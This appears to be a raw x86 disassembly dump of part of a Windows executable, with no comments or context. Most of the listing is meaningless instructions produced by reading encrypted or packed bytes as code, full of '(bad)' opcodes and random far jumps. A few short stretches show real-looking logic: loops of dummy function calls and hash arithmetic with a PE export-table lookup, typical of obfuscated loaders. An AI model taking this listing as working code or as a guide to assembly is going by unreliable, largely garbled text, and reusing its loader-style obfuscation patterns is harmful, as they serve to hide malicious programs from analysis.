  4049b5:	dec    ecx
  4049b6:	cwde   
  4049b7:	inc    ecx
  4049b8:	test   al,0x57
  4049ba:	xchg   edi,eax
  4049bb:	jle    0x4049cb
  4049bd:	test   BYTE PTR [ebp+eiz*8-0x3b8fc35b],ah
  4049c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049c5:	fnstsw WORD PTR [esp+edi*8]
  4049c8:	fnstenv [ebp+edi*4-0x4c9d9038]
  4049cf:	(bad)
  4049d2:	mov    edi,0xebc9c880
  4049d7:	adc    esi,eax
  4049d9:	hlt    
  4049da:	push   ebx
  4049db:	popa   
  4049dc:	rol    BYTE PTR [esi-0x75],1
  4049df:	cdq    
  4049e0:	xlat   BYTE PTR ds:[ebx]
  4049e1:	imul   ebp,DWORD PTR [ebp-0x2793337e],0x46
  4049e8:	push   esp
  4049e9:	xor    al,0x2b
  4049eb:	jecxz  0x4049ce
  4049ed:	es mov cl,0x32
  4049f0:	push   0x87696215
  4049f5:	call   0xa594:0xf427e60
  4049fc:	bound  ebx,QWORD PTR [edi-0x27f4dabe]
  404a02:	jbe    0x404a01
  404a04:	bound  esi,QWORD PTR [esi]
  404a06:	mov    WORD PTR [ecx-0x2b],fs
  404a09:	xchg   bl,bh
  404a0b:	mov    ds:0xa82d0f50,al
  404a10:	mov    ecx,?
  404a12:	jg     0x404a20
  404a14:	mov    dl,0xf8
  404a16:	push   es
  404a17:	mov    al,ds:0x678df864
  404a1c:	int3   
  404a1d:	xchg   DWORD PTR [esi+0x1f],ebx
  404a20:	in     eax,dx
  404a21:	cmc    
  404a22:	pop    esi
  404a23:	xchg   esi,eax
  404a24:	icebp  
  404a25:	popf   
  404a26:	adc    al,0xbb
  404a28:	jne    0x4049c6
  404a2a:	and    ah,dh
  404a2c:	out    0xe8,eax
  404a2e:	mov    eax,ds:0x2595e9c7
  404a33:	fdiv   QWORD PTR ds:0x1b549c13
  404a39:	mov    edx,0x81f60b8e
  404a3e:	mov    al,0xe7
  404a40:	jp     0x404a3e
  404a42:	je     0x404a4c
  404a44:	add    BYTE PTR [edi],bh
  404a46:	add    ebp,DWORD PTR [edx-0x2d]
  404a49:	jb     0x404a87
  404a4b:	inc    edi
  404a4c:	xchg   esp,eax
  404a4d:	pushf  
  404a4e:	icebp  
  404a4f:	arpl   WORD PTR ds:0xe65ef7f2,cx
  404a55:	dec    eax
  404a56:	rcr    DWORD PTR [eax-0x58b6ac66],1
  404a5c:	sub    al,0x8d
  404a5f:	lea    ebp,[esi+0x352e1fac]
  404a65:	xor    BYTE PTR [esi-0x7653afce],0x52
  404a6c:	cld    
  404a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a6e:	xlat   BYTE PTR ds:[ebx]
  404a6f:	add    cl,dh
  404a71:	mov    BYTE PTR [eax],ch
  404a73:	rcr    BYTE PTR [edi+ebp*8+0x45],1
  404a77:	pusha  
  404a78:	pop    edi
  404a79:	dec    ebx
  404a7a:	rol    dh,0x55
  404a7d:	repz sub eax,0x9e187f8
  404a83:	mov    ah,0x5e
  404a85:	push   eax
  404a86:	jne    0x404a88
  404a88:	popf   
  404a89:	test   eax,0x5ba78b7c
  404a8e:	fstp   QWORD PTR [edi-0x7d]
  404a91:	test   eax,0x284e3d3b
  404a96:	inc    ebp
  404a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a98:	std    
  404a99:	jno    0x404a55
  404a9b:	dec    edi
  404a9c:	mov    DWORD PTR [ebx],eax
  404a9e:	(bad)  
  404a9f:	repz lock fwait
  404aa2:	push   esp
  404aa3:	sbb    BYTE PTR [edx+0x369b2edf],dl
  404aa9:	jne    0x404a8e
  404aab:	(bad)  
  404aac:	in     al,dx
  404aad:	fiadd  WORD PTR [ebx+0x625745ef]
  404ab3:	cwde   
  404ab4:	in     eax,dx
  404ab5:	mov    esp,0xa697eafe
  404aba:	push   esi
  404abb:	pop    DWORD PTR [ebx+eiz*2-0x34]
  404abf:	pop    edi
  404ac0:	sbb    al,0x8
  404ac2:	xor    edi,DWORD PTR [ecx]
  404ac4:	push   esp
  404ac5:	add    cl,BYTE PTR [eax+0x3e]
  404ac8:	mov    ecx,0x6e48d36f
  404acd:	in     al,dx
  404ace:	int3   
  404acf:	mov    bl,0x93
  404ad1:	push   ds
  404ad2:	ficomp WORD PTR [edi-0x1a]
  404ad5:	or     ecx,DWORD PTR [ebx-0x18]
  404ad8:	mov    ecx,DWORD PTR [edx]
  404ada:	adc    DWORD PTR [ebp+eiz*4+0x7179bbe6],eax
  404ae1:	pop    ss
  404ae2:	jo     0x404b49
  404ae4:	dec    ecx
  404ae5:	dec    esi
  404ae6:	in     eax,dx
  404ae7:	mov    WORD PTR [eax+0x757c10b5],cs
  404aed:	and    bh,bh
  404aef:	mov    ch,0xd9
  404af1:	xor    al,0x16
  404af3:	xchg   cl,dh
  404af5:	sti    
  404af6:	jg     0x404add
  404af8:	jns    0x404b5c
  404afa:	pop    esi
  404afb:	fmul   QWORD PTR [ebx+ebp*4+0x36b5180b]
  404b02:	xchg   ebp,eax
  404b03:	mov    eax,0x51d1e397
  404b08:	imul   esp,DWORD PTR [ebp+0x7b],0x7
  404b0c:	enter  0xdb45,0x66
  404b10:	add    ebx,DWORD PTR [esi-0x3]
  404b13:	das    
  404b14:	push   es
  404b15:	mov    esi,0x64a0da7d
  404b1a:	das    
  404b1b:	clc    
  404b1c:	leave  
  404b1d:	and    BYTE PTR [edx-0x233d709c],cl
  404b23:	retf   
  404b24:	fdivrp st(1),st
  404b26:	rcl    BYTE PTR [edx-0x37],0xe4
  404b2a:	fistp  WORD PTR [esi-0x37bd7727]
  404b30:	pop    ebx
  404b31:	outs   dx,DWORD PTR ds:[esi]
  404b32:	adc    cl,cl
  404b34:	pop    ds
  404b35:	daa    
  404b36:	dec    eax
  404b37:	icebp  
  404b38:	lods   al,BYTE PTR ds:[esi]
  404b39:	jmp    0x404b4a
  404b3b:	pop    ebp
  404b3c:	out    0x63,eax
  404b3e:	scas   al,BYTE PTR es:[edi]
  404b3f:	mov    edx,0xad74fb51
  404b44:	push   eax
  404b45:	arpl   WORD PTR [esi+0x65cb57dd],di
  404b4b:	out    0x91,al
  404b4d:	push   edi
  404b4e:	add    bh,BYTE PTR [ebp-0x360543d]
  404b54:	add    esp,DWORD PTR [ebx]
  404b56:	ret    0xa692
  404b59:	mov    ah,0x35
  404b5b:	in     al,dx
  404b5c:	lahf   
  404b5d:	xor    al,0xd3
  404b5f:	xor    BYTE PTR [esi+0x1587785],dl
  404b65:	pop    esi
  404b66:	xchg   ecx,eax
  404b67:	jmp    FWORD PTR [esi+0x44343b31]
  404b6d:	sbb    bh,al
  404b6f:	xchg   edx,eax
  404b70:	jmp    0x719f4d6
  404b75:	cld    
  404b76:	(bad)  
  404b78:	fstp   QWORD PTR [ebp-0x7f49aac0]
  404b7e:	in     al,dx
  404b7f:	xlat   BYTE PTR ds:[ebx]
  404b80:	and    BYTE PTR [ecx-0x3ee4b8c4],0x9c
  404b87:	data16 clc 
  404b89:	aad    0x66
  404b8b:	aam    0x28
  404b8d:	mov    dl,0xea
  404b8f:	fdivr  QWORD PTR [edi+0x2de65a68]
  404b95:	gs jne 0x404b97
  404b98:	shl    BYTE PTR [edx+0x32],cl
  404b9b:	sub    edi,DWORD PTR [ecx-0x13a51fdd]
  404ba1:	fwait
  404ba2:	mov    edx,0xb3ba358
  404ba7:	inc    eax
  404ba8:	(bad)  
  404ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404baa:	(bad)  
  404bab:	(bad)  [edi+ecx*4+0x36f9f91a]
  404bb2:	into   
  404bb3:	cmp    BYTE PTR [edi-0x336f2ceb],al
  404bb9:	int3   
  404bba:	arpl   WORD PTR [ebp+0x1],bx
  404bbd:	mov    edx,0x87648b54
  404bc2:	or     BYTE PTR [edi-0x109db897],ah
  404bc8:	adc    eax,0xf2fc44a4
  404bcd:	push   esi
  404bce:	push   esi
  404bcf:	add    DWORD PTR es:[esi-0x1e],0x6544e211
  404bd7:	and    eax,0x3fe5dbe
  404bdc:	js     0x404c0c
  404bde:	ds das 
  404be0:	les    esi,FWORD PTR [ebp-0x37]
  404be3:	jmp    0xc1538e12
  404be8:	adc    BYTE PTR ds:0x21942f34,ah
  404bee:	test   al,0x67
  404bf0:	dec    esi
  404bf1:	inc    ebx
  404bf2:	repnz push edi
  404bf4:	retf   
  404bf5:	or     BYTE PTR [edi-0x1e],cl
  404bf8:	or     DWORD PTR [edx-0x26dde7c5],ecx
  404bfe:	js     0x404bdf
  404c00:	mov    al,0xca
  404c02:	mov    bh,0xf5
  404c04:	ss pop esp
  404c06:	adc    esi,ebx
  404c08:	dec    edi
  404c09:	ja     0x404c63
  404c0b:	cmc    
  404c0c:	add    al,0x9d
  404c0e:	adc    eax,0x7f84e263
  404c13:	add    dh,BYTE PTR [eax-0x48]
  404c16:	lock jg 0x404bff
  404c19:	mov    esi,DWORD PTR [esp+ebp*2-0x14]
  404c1d:	cwde   
  404c1e:	imul   esp,DWORD PTR [ebp-0x1be44593],0x24922c70
  404c28:	dec    edx
  404c29:	jae    0x404bf1
  404c2b:	jecxz  0x404c89
  404c2d:	cli    
  404c2e:	and    dl,BYTE PTR [ecx]
  404c30:	pop    edi
  404c31:	pusha  
  404c32:	or     edi,ebp
  404c34:	cmc    
  404c35:	call   0x74f4:0xdaf61ae1
  404c3c:	sahf   
  404c3d:	test   al,0x89
  404c3f:	pop    edx
  404c40:	rcr    BYTE PTR [ecx-0x34],1
  404c43:	loope  0x404cbf
  404c45:	ffreep st(5)
  404c47:	ret    0x72b4
  404c4a:	int3   
  404c4b:	inc    edx
  404c4c:	pop    edi
  404c4d:	mov    dh,0x9f
  404c4f:	dec    edx
  404c50:	xchg   edi,eax
  404c51:	dec    esp
  404c52:	retf   0xd1a6
  404c55:	stos   DWORD PTR es:[edi],eax
  404c56:	pusha  
  404c57:	scas   al,BYTE PTR es:[edi]
  404c58:	gs ss int3 
  404c5b:	jbe    0x404be5
  404c5d:	pop    edx
  404c5e:	mov    bl,0x80
  404c60:	pusha  
  404c61:	sub    DWORD PTR ds:0x55936eef,ebp
  404c67:	fisttp QWORD PTR [ebx]
  404c69:	add    ecx,DWORD PTR [ecx]
  404c6b:	out    0x57,al
  404c6d:	sahf   
  404c6e:	aas    
  404c6f:	popa   
  404c70:	loopne 0x404c20
  404c72:	(bad)  
  404c73:	(bad)  
  404c74:	rcr    DWORD PTR [eax+esi*1+0x1f],cl
  404c78:	out    0x59,eax
  404c7a:	mov    ebp,0xb9bbaa6
  404c7f:	or     ebx,DWORD PTR [edx+0x78ffdab5]
  404c85:	scas   al,BYTE PTR es:[edi]
  404c86:	out    dx,al
  404c87:	div    BYTE PTR [ebp+0x6813a05f]
  404c8d:	int    0x1d
  404c8f:	(bad)  
  404c91:	scas   eax,DWORD PTR es:[edi]
  404c92:	add    al,0xc1
  404c94:	jl     0x404c62
  404c96:	test   al,0x16
  404c98:	push   0x88f87e73
  404c9d:	adc    dl,BYTE PTR [esi-0x13]
  404ca0:	loope  0x404c62
  404ca2:	bound  esp,QWORD PTR [ecx-0x3b]
  404ca5:	repnz mov es,eax
  404ca8:	inc    ecx
  404ca9:	lock mov ah,0xcf
  404cac:	jmp    0x404c5d
  404cae:	sbb    al,0xc9
  404cb0:	mov    edx,0x6b99a670
  404cb5:	pusha  
  404cb6:	mov    ebx,0xf2017c01
  404cbb:	sub    al,0xe1
  404cbd:	daa    
  404cbe:	jae    0x404d21
  404cc0:	sub    eax,0xd7ca0d20
  404cc5:	cld    
  404cc6:	icebp  
  404cc7:	mov    bh,cl
  404cc9:	mov    esi,0xff3883d8
  404cce:	xchg   BYTE PTR ds:0xa12e0780,ah
  404cd4:	stos   BYTE PTR es:[edi],al
  404cd5:	cmp    al,0x13
  404cd7:	inc    ebx
  404cd8:	push   es
  404cd9:	je     0x404d2a
  404cdb:	(bad)  [ebp+ecx*8+0x79f0a00b]
  404ce2:	xchg   ecx,eax
  404ce3:	(bad)  
  404ce4:	jnp    0x404c9e
  404ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ce7:	ss jae 0x404cec
  404cea:	dec    edi
  404ceb:	mov    ds:0xf1db98cd,eax
  404cf0:	pop    ebp
  404cf1:	ss inc edi
  404cf3:	dec    ebp
  404cf4:	jnp    0x404ca2
  404cf6:	cmp    BYTE PTR [edx+0x69938553],dh
  404cfc:	xchg   BYTE PTR [ebx+0x81ec45],cl
  404d02:	mov    edx,?
  404d04:	add    eax,0xf0458b07
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0x7aa7d7b
  404d49:	mov    ds:0x2f1b689a,al
  404d4e:	jle    0x404dce
  404d50:	pop    esi
  404d51:	jg     0x404dd1
  404d53:	jle    0x404d1d
  404d55:	sti    
  404d56:	push   es
  404d57:	stos   DWORD PTR es:[edi],eax
  404d58:	adc    ebp,edx
  404d5a:	loope  0x404dc2
  404d5c:	jmp    0x404dd4
  404d5e:	call   0xf6a45a7a
  404d63:	inc    esp
  404d64:	das    
  404d65:	jg     0x404dcf
  404d67:	in     al,dx
  404d68:	std    
  404d69:	rcl    BYTE PTR [ecx+0x4b],1
  404d6c:	dec    eax
  404d6d:	or     ah,BYTE PTR [ebx+0x5cab0b4]
  404d73:	and    BYTE PTR [edi],bh
  404d75:	sbb    BYTE PTR [ebx],al
  404d77:	repnz mov al,ds:0x961a8807
  404d7d:	adc    BYTE PTR [ecx+0x3d],al
  404d80:	lods   al,BYTE PTR ds:[esi]
  404d81:	xchg   esp,eax
  404d82:	call   0xf2a5:0x3315a2eb
  404d89:	fbstp  TBYTE PTR [ecx+0x2e]
  404d8c:	outs   dx,BYTE PTR ds:[esi]
  404d8d:	adc    dh,al
  404d8f:	add    BYTE PTR [edi],ch
  404d91:	clc    
  404d92:	jbe    0x404dac
  404d94:	ss add bh,cl
  404d97:	mov    ah,0x23
  404d99:	cmp    DWORD PTR [edx-0x2f],eax
  404d9c:	cli    
  404d9d:	inc    ebx
  404d9e:	pusha  
  404d9f:	jmp    0x404dd8
  404da1:	jle    0x404d84
  404da3:	push   0x7e
  404da5:	inc    esp
  404da6:	les    ecx,FWORD PTR [edi-0x41324c51]
  404dac:	ret    0xf343
  404daf:	jo     0x404de1
  404db1:	xor    BYTE PTR [ebx+ecx*2+0x51417b2d],bh
  404db8:	mov    edi,0x874c6ea2
  404dbd:	and    eax,0x2599386c
  404dc2:	mov    ss,esp
  404dc4:	popf   
  404dc5:	(bad)  
  404dc6:	jmp    0x404d6c
  404dc8:	stos   BYTE PTR es:[edi],al
  404dc9:	mov    BYTE PTR [ebx],cl
  404dcb:	sar    DWORD PTR [ecx+ecx*8-0x6c],cl
  404dcf:	fist   DWORD PTR [ebx-0x53]
  404dd2:	mov    ecx,0xe7eaa1a7
  404dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dd8:	sub    BYTE PTR [eax],ch
  404dda:	retf   
  404ddb:	call   DWORD PTR [esi]
  404ddd:	jmp    0x404d5f
  404ddf:	jl     0x404e03
  404de1:	sbb    dh,0x6c
  404de4:	mov    ebp,0x4728107c
  404de9:	cld    
  404dea:	das    
  404deb:	add    BYTE PTR [ebx+0x21],0xdd
  404def:	cwde   
  404df0:	(bad)  
  404df1:	aas    
  404df2:	dec    eax
  404df3:	xchg   DWORD PTR [edi],edi
  404df5:	cmp    ebx,0x3015b02
  404dfb:	cmp    BYTE PTR [ebp+0x2487e2c3],ch
  404e01:	inc    eax
  404e02:	daa    
  404e03:	adc    dl,BYTE PTR [ebp-0x31d53c6f]
  404e09:	adc    edx,edi
  404e0b:	adc    bl,BYTE PTR [edx]
  404e0d:	fistp  DWORD PTR [esi+0x13]
  404e10:	rol    DWORD PTR [eax+0x22ce194f],1
  404e16:	push   0xb7fd07d3
  404e1b:	stos   BYTE PTR es:[edi],al
  404e1c:	lahf   
  404e1d:	pop    ds
  404e1e:	iret   
  404e1f:	cld    
  404e20:	jb     0x404e88
  404e22:	call   0x6ce236dd
  404e27:	scas   eax,DWORD PTR es:[edi]
  404e28:	cmp    eax,0x5ce1f2ab
  404e2d:	jo     0x404e45
  404e2f:	mov    eax,0x1ad545d6
  404e34:	add    ch,BYTE PTR [ecx+0x2fd79b0c]
  404e3a:	(bad)  
  404e3b:	je     0x404df6
  404e3d:	push   edi
  404e3e:	cmp    al,0x19
  404e40:	ins    DWORD PTR es:[edi],dx
  404e41:	adc    DWORD PTR [edx+0x43a4c039],ebp
  404e47:	and    DWORD PTR [edi],edx
  404e49:	sbb    ecx,ebx
  404e4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e4c:	ret    
  404e4d:	inc    eax
  404e4e:	and    eax,0xa8d361c0
  404e53:	or     al,0x88
  404e55:	inc    esp
  404e56:	or     edx,ecx
  404e58:	pushf  
  404e59:	test   eax,ebp
  404e5b:	jno    0x404e1c
  404e5d:	mov    al,ds:0x41c839cf
  404e62:	mov    al,0xf9
  404e64:	data16 daa 
  404e66:	inc    esp
  404e67:	std    
  404e68:	sti    
  404e69:	or     eax,0xb7a5b861
  404e6e:	dec    edx
  404e6f:	sbb    DWORD PTR [esi],ebp
  404e71:	arpl   WORD PTR [ecx],dx
  404e73:	stc    
  404e74:	stos   DWORD PTR es:[edi],eax
  404e75:	out    dx,al
  404e76:	push   es
  404e77:	add    al,0x21
  404e79:	sbb    al,0xb3
  404e7b:	add    al,0x5
  404e7d:	and    BYTE PTR [edx+edx*4+0x57],al
  404e81:	adc    bh,al
  404e83:	popa   
  404e84:	xchg   DWORD PTR [edx+esi*8+0x74],esp
  404e88:	ficomp DWORD PTR [ebx+0x7c]
  404e8b:	jnp    0x404e94
  404e8d:	inc    edx
  404e8e:	adc    eax,0x35bcc9a6
  404e93:	jmp    DWORD PTR [ecx-0x66eb9193]
  404e99:	fwait
  404e9a:	icebp  
  404e9b:	xchg   edi,eax
  404e9c:	adc    cl,BYTE PTR [edx]
  404e9e:	or     eax,0x1358bf55
  404ea3:	clc    
  404ea4:	xchg   edx,eax
  404ea5:	push   es
  404ea6:	jo     0x404e59
  404ea8:	push   esp
  404ea9:	lods   eax,DWORD PTR ds:[esi]
  404eaa:	xor    dh,bl
  404eac:	inc    edx
  404ead:	(bad)  
  404eae:	jmp    0x404e86
  404eb0:	jno    0x404e8c
  404eb2:	pop    edx
  404eb3:	ja     0x404f2c
  404eb5:	inc    ebp
  404eb6:	scas   eax,DWORD PTR es:[edi]
  404eb7:	sbb    BYTE PTR [ebx],ch
  404eb9:	sub    eax,0x2f007944
  404ebe:	(bad)  
  404ebf:	fnstcw WORD PTR [ecx+0x153f4276]
  404ec5:	in     eax,0x5f
  404ec7:	loopne 0x404e8a
  404ec9:	sub    BYTE PTR [ebp+ecx*1+0x5],dl
  404ecd:	add    al,0xbf
  404ecf:	or     BYTE PTR [eax+0x6f],bl
  404ed2:	push   0x5d6fd09a
  404ed7:	rcr    edi,1
  404ed9:	in     al,dx
  404eda:	inc    esi
  404edb:	cli    
  404edc:	mov    ebp,0x120f0c1f
  404ee1:	into   
  404ee2:	xlat   BYTE PTR ds:[ebx]
  404ee3:	cwde   
  404ee4:	mov    ?,WORD PTR [edx+0x1d]
  404ee7:	ffree  st(4)
  404ee9:	lea    eax,[ebx-0x3c]
  404eec:	jns    0x404eff
  404eee:	dec    ebx
  404eef:	xor    eax,0x23a9a72b
  404ef4:	push   es
  404ef5:	popa   
  404ef6:	aaa    
  404ef7:	add    eax,0x43f15c80
  404efc:	nop
  404efd:	xor    edi,0xa210bd62
  404f03:	xor    bh,ch
  404f05:	pop    eax
  404f06:	or     BYTE PTR [edx-0x8],0xe7
  404f0a:	cmp    eax,0xcf7fdb8e
  404f0f:	sub    edi,ebx
  404f11:	sub    ch,BYTE PTR [esi+0x561dc791]
  404f17:	shr    BYTE PTR [eax+0x4d5ab60d],cl
  404f1d:	sti    
  404f1e:	mov    bl,0xf5
  404f20:	(bad)  
  404f22:	xchg   edi,eax
  404f23:	mov    edi,0xb6f4bea3
  404f28:	fimul  WORD PTR [ebp-0x41f33530]
  404f2e:	push   ds
  404f2f:	icebp  
  404f30:	or     eax,0x511cba68
  404f35:	or     edx,DWORD PTR ds:0x43467b
  404f3b:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  404f42:	mov    DWORD PTR ds:0x43470b,0x1c
  404f4c:	cmp    DWORD PTR ds:0x43470b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43470b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43470b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43470b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x434673,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434713,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434713
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434713,edx
  404fbc:	cmp    DWORD PTR ds:0x434713,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x4348c9
  404fce:	push   0x43484e
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434713,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x4346b7
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x4346b7,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	mov    WORD PTR [edx],es
  405051:	push   ebp
  405052:	popf   
  405053:	jnp    0x40507e
  405055:	jle    0x4050d5
  405057:	pop    esi
  405058:	jg     0x4050d8
  40505a:	jle    0x40507e
  40505c:	jmp    0xe4a09695
  405061:	pop    esi
  405062:	xor    al,0x94
  405064:	inc    ebx
  405065:	fwait
  405066:	add    esi,DWORD PTR [edx+esi*8-0x6f]
  40506a:	pop    ss
  40506b:	and    bh,cl
  40506d:	pusha  
  40506e:	push   edi
  40506f:	mov    edi,0x135d85e9
  405074:	mov    eax,0x60286e16
  405079:	inc    esp
  40507a:	aaa    
  40507b:	neg    DWORD PTR [esi]
  40507d:	push   esp
  40507e:	xchg   ecx,eax
  40507f:	and    BYTE PTR [edi-0x17816967],bh
  405085:	js     0x405042
  405087:	dec    ebp
  405088:	jmp    0xfbe5:0x69454522
  40508f:	cmc    
  405090:	arpl   WORD PTR [ebp+0x7bec3d99],bx
  405096:	mov    DWORD PTR [ecx-0x50122410],esi
  40509c:	in     eax,dx
  40509d:	fwait
  40509e:	cmp    DWORD PTR [esi],0xc6c03757
  4050a4:	fisubr DWORD PTR gs:[esi]
  4050a7:	repnz mov esi,0x1ac98a51
  4050ad:	add    al,0x49
  4050af:	rcl    BYTE PTR [esi],cl
  4050b1:	cmp    DWORD PTR [edi-0x46],eax
  4050b4:	test   bl,al
  4050b6:	(bad)  
  4050b7:	mov    al,0x5f
  4050b9:	add    DWORD PTR [esi-0x57168f6f],edi
  4050bf:	test   esi,esi
  4050c1:	loop   0x405088
  4050c3:	inc    ebp
  4050c4:	ds call 0x2f79c293
  4050ca:	dec    ebp
  4050cb:	add    ah,0xbd
  4050ce:	jne    0x405074
  4050d0:	adc    ch,bl
  4050d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050d3:	fcmovne st,st(3)
  4050d5:	aaa    
  4050d6:	ret    0x69e3
  4050d9:	mov    esi,0x5c0f4890
  4050de:	js     0x4050b5
  4050e0:	ja     0x405080
  4050e2:	mov    ch,0xba
  4050e4:	jns    0x405074
  4050e6:	adc    eax,0x4c31842d
  4050eb:	shl    al,cl
  4050ed:	je     0x4050d7
  4050ef:	iret   
  4050f0:	sub    dh,cl
  4050f2:	clc    
  4050f3:	shl    DWORD PTR [ebx+0x18412e45],1
  4050f9:	push   edi
  4050fa:	pop    es
  4050fb:	inc    eax
  4050fc:	mov    ah,0xb
  4050fe:	inc    ebx
  4050ff:	push   ss
  405100:	cmp    eax,0xf528e434
  405105:	sbb    DWORD PTR [esi-0x2849d3c3],esp
  40510b:	add    BYTE PTR [eax-0x2db2d43],cl
  405111:	dec    eax
  405112:	dec    edi
  405113:	fst    QWORD PTR [ecx-0x329f465e]
  405119:	test   eax,0xb6c312a7
  40511e:	mov    cl,0xfc
  405120:	mov    cl,0x61
  405122:	out    0x3d,al
  405124:	aas    
  405125:	jmp    0x200e4779
  40512a:	int3   
  40512b:	cli    
  40512c:	lods   eax,DWORD PTR ds:[esi]
  40512d:	es cmp ah,ch
  405130:	inc    edx
  405131:	xchg   DWORD PTR [esi],ecx
  405133:	les    ecx,FWORD PTR [ecx+eiz*8+0x6a84b223]
  40513a:	jo     0x405119
  40513c:	dec    esp
  40513d:	sub    BYTE PTR [edx],ch
  40513f:	leave  
  405140:	dec    esp
  405141:	pop    ebp
  405142:	mov    eax,0xea7352b5
  405147:	leave  
  405148:	lea    eax,[edx-0x38]
  40514b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40514c:	(bad)  
  40514d:	call   FWORD PTR [eax]
  40514f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405150:	outs   dx,BYTE PTR ds:[esi]
  405151:	imul   ecx,ebx,0xbcd3ece0
  405157:	sbb    esp,DWORD PTR [edx+esi*8-0x38]
  40515b:	adc    ch,BYTE PTR [ecx]
  40515d:	pop    edi
  40515e:	cmp    DWORD PTR [eax-0x1494c295],ecx
  405164:	adc    al,0xce
  405166:	mov    WORD PTR [ebx],?
  405168:	jnp    0x405178
  40516a:	aaa    
  40516b:	int3   
  40516c:	cmp    DWORD PTR [edi],0x65e1d64a
  405172:	push   esi
  405173:	sbb    DWORD PTR [ecx+0x58],0x63663065
  40517a:	lock mov esi,0xfba0e495
  405180:	in     al,dx
  405181:	gs xchg esi,eax
  405183:	push   es
  405184:	dec    ebp
  405185:	popa   
  405186:	sub    BYTE PTR [esi],cl
  405188:	sbb    ebp,DWORD PTR [ebp-0xa]
  40518b:	loope  0x40511a
  40518d:	lods   al,BYTE PTR ds:[esi]
  40518e:	or     eax,0x9f8ce814
  405193:	push   ds
  405194:	pop    ebx
  405195:	mov    ds:0x24c0e04c,eax
  40519a:	jbe    0x4051ab
  40519c:	xor    DWORD PTR [ecx+0x985a57a],edi
  4051a2:	out    dx,eax
  4051a3:	gs sub eax,0x4fae6cc9
  4051a9:	and    al,0x7a
  4051ab:	popf   
  4051ac:	or     al,0xc4
  4051ae:	push   ebp
  4051af:	or     bh,BYTE PTR [edx]
  4051b1:	inc    ecx
  4051b2:	xor    eax,0xb11d756a
  4051b7:	sbb    DWORD PTR [esi],0x26
  4051ba:	lea    edi,[esi-0x54]
  4051bd:	fisubr DWORD PTR [ecx-0x43]
  4051c0:	adc    bl,BYTE PTR ds:0xd57bb2d7
  4051c6:	add    BYTE PTR ss:[esi],dl
  4051c9:	add    BYTE PTR [edx-0x2c],dh
  4051cc:	mov    WORD PTR [edi-0x762cf962],gs
  4051d2:	scas   al,BYTE PTR es:[edi]
  4051d3:	in     al,0x81
  4051d5:	add    cl,cl
  4051d7:	scas   eax,DWORD PTR es:[edi]
  4051d8:	(bad)  
  4051d9:	cmp    bl,BYTE PTR [ebp+0x4a]
  4051dc:	sbb    ebp,DWORD PTR [edi+0x5e]
  4051df:	mov    ebp,0xe8d3dd3f
  4051e4:	popf   
  4051e5:	enter  0x439f,0xe3
  4051e9:	fdiv   QWORD PTR [eax-0x65fadd38]
